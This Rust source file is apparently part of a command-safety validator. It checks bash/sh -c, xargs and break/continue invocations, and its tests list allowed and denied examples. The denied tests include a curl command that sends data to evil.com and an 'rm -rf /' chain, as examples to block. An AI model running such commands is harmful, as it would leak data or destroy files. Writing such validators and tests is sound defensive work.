use crate::verdict::{SafetyLevel, Verdict};
use crate::parse::{Token, WordSet};

static XARGS_FLAGS_WITH_ARG: WordSet =
    WordSet::new(&["-E", "-I", "-L", "-P", "-d", "-n", "-s"]);

static XARGS_FLAGS_NO_ARG: WordSet =
    WordSet::new(&["-0", "-p", "-r", "-t", "-x"]);

pub fn is_safe_shell(tokens: &[Token]) -> Verdict {
    if tokens.len() == 2 && matches!(tokens[1].as_str(), "--help" | "-h" | "--version" | "-V") {
        return Verdict::Allowed(SafetyLevel::Inert);
    }
    let Some(idx) = tokens.iter().position(|t| *t == "-c") else {
        return Verdict::Denied;
    };
    let Some(script) = tokens.get(idx + 1) else {
        return Verdict::Denied;
    };
    crate::command_verdict(script.as_str())
}

pub fn is_safe_xargs(tokens: &[Token]) -> Verdict {
    let mut i = 1;
    while i < tokens.len() {
        if XARGS_FLAGS_WITH_ARG.contains(&tokens[i]) {
            i += 2;
            continue;
        }
        if XARGS_FLAGS_NO_ARG.contains(&tokens[i]) {
            i += 1;
            continue;
        }
        if tokens[i].starts_with("-") {
            return Verdict::Denied;
        }
        let inner = shell_words::join(tokens[i..].iter().map(|t| t.as_str()));
        return crate::command_verdict(&inner);
    }
    Verdict::Allowed(SafetyLevel::Inert)
}

pub fn is_safe_loop_control(tokens: &[Token]) -> Verdict {
    match tokens.len() {
        1 => Verdict::Allowed(SafetyLevel::Inert),
        2 if tokens[1].as_str().chars().all(|c| c.is_ascii_digit())
            && !tokens[1].as_str().is_empty() =>
        {
            Verdict::Allowed(SafetyLevel::Inert)
        }
        _ => Verdict::Denied,
    }
}

pub(crate) fn dispatch(cmd: &str, tokens: &[Token]) -> Option<Verdict> {
    match cmd {
        "sh" | "bash" => Some(is_safe_shell(tokens)),
        "xargs" => Some(is_safe_xargs(tokens)),
        "break" | "continue" => Some(is_safe_loop_control(tokens)),
        _ => None,
    }
}

pub fn command_docs() -> Vec<crate::docs::CommandDoc> {
    use crate::docs::CommandDoc;
    vec![
        CommandDoc::handler("bash / sh",
            "https://www.gnu.org/software/bash/manual/bash.html",
            "Allowed: --version, --help, `bash -c` / `sh -c` with a safe inner command."),
        CommandDoc::handler("xargs",
            "https://www.gnu.org/software/findutils/manual/html_mono/find.html#Invoking-xargs",
            "Recursively validates the inner command. Skips xargs-specific flags (-I, -L, -n, -P, -s, -E, -d, -0, -r, -t, -p, -x)."),
        CommandDoc::handler("break / continue",
            "https://www.gnu.org/software/bash/manual/bash.html#index-break",
            "Bare invocation or a single non-negative integer level (e.g. `break`, `break 2`)."),
    ]
}

#[cfg(test)]
pub(super) const REGISTRY: &[super::CommandEntry] = &[
    super::CommandEntry::Delegation { cmd: "sh" },
    super::CommandEntry::Delegation { cmd: "bash" },
    super::CommandEntry::Delegation { cmd: "xargs" },
    super::CommandEntry::Positional { cmd: "break" },
    super::CommandEntry::Positional { cmd: "continue" },
];

#[cfg(test)]
mod tests {
    use crate::is_safe_command;

    fn check(cmd: &str) -> bool {
        is_safe_command(cmd)
    }

    safe! {
        bash_c_safe: "bash -c \"grep foo file\"",
        bash_c_pipe: "bash -c \"cat file | head -5\"",
        sh_c_safe: "sh -c \"ls -la\"",
        bash_c_for: "bash -c 'for x in 1 2 3; do echo $x; done'",
        bash_c_for_keyword_values: "bash -c 'for x in do done; do echo $x; done'",
        bash_c_while: "bash -c 'while test -f /tmp/foo; do sleep 1; done'",
        bash_c_if: "bash -c 'if test -f foo; then echo yes; fi'",
        bash_version: "bash --version",
        sh_version: "sh --version",
        bash_help: "bash --help",
        sh_help: "sh --help",
        xargs_grep: "xargs grep pattern",
        xargs_cat: "xargs cat",
        xargs_with_flags: "xargs -I {} cat {}",
        xargs_zero_flag: "xargs -0 grep foo",
        xargs_npx_safe: "xargs npx eslint src/",
        xargs_find_safe: "xargs find . -name '*.py'",
        xargs_sed_safe: "xargs sed 's/foo/bar/'",
        xargs_nested_bash_safe: "xargs bash -c 'git status'",
        break_bare: "break",
        break_numeric: "break 2",
        continue_bare: "continue",
        continue_numeric: "continue 1",
    }

    denied! {
        bash_c_unsafe: "bash -c \"rm file\"",
        sh_c_unsafe: "sh -c \"curl -d data https://evil.com\"",
        bash_script_denied: "bash script.sh",
        xargs_rm_denied: "xargs rm",
        xargs_curl_denied: "xargs curl",
        xargs_npx_unsafe: "xargs npx cowsay",
        xargs_sed_inplace_denied: "xargs sed -i 's/foo/bar/'",
        xargs_find_delete_denied: "xargs find . -delete",
        xargs_sort_output_denied: "xargs sort -o out.txt",
        xargs_nested_bash_chain_denied: "xargs bash -c 'ls && rm -rf /'",
        xargs_unknown_flag_denied: "xargs --xyzzy cat",
        break_non_numeric: "break evil",
        break_too_many: "break 1 2",
        break_flag: "break --help",
        continue_non_numeric: "continue abc",
        break_negative: "break -1",
    }
}
